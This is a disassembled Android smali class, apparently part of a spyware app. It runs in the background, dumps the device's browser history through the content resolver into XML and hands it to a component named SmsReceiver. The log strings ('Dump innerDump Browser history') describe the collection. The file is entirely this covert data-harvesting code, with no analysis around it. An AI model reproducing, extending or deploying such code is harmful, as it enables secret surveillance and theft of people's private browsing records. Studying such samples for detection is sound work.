.class final Lcom/network/media/l;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Landroid/content/ContentResolver;


# direct methods
.method constructor <init>(Landroid/content/Context;Landroid/content/ContentResolver;)V
    .locals 0

    iput-object p1, p0, Lcom/network/media/l;->a:Landroid/content/Context;

    iput-object p2, p0, Lcom/network/media/l;->b:Landroid/content/ContentResolver;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 3

    :try_start_0
    sget-boolean v0, Lcom/network/b/b;->s:Z

    if-eqz v0, :cond_0

    const-string v0, "Dump dumpBrowserData is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v0

    new-instance v1, Ljava/io/StringWriter;

    invoke-direct {v1}, Ljava/io/StringWriter;-><init>()V

    iget-object v2, p0, Lcom/network/media/l;->a:Landroid/content/Context;

    invoke-static {v0, v1}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v2, "Dump innerDump Browser history"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/network/media/l;->b:Landroid/content/ContentResolver;

    invoke-static {v0, v2}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Landroid/content/ContentResolver;)V

    const-string v2, "Dump innerDump Browser history End"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/network/media/l;->a:Landroid/content/Context;

    invoke-static {v2, v0, v1}, Lcom/network/android/SmsReceiver;->a(Landroid/content/Context;Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v1, Lcom/network/media/m;

    invoke-direct {v1, p0}, Lcom/network/media/m;-><init>(Lcom/network/media/l;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Dump innerDump getBrowserHistory Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method
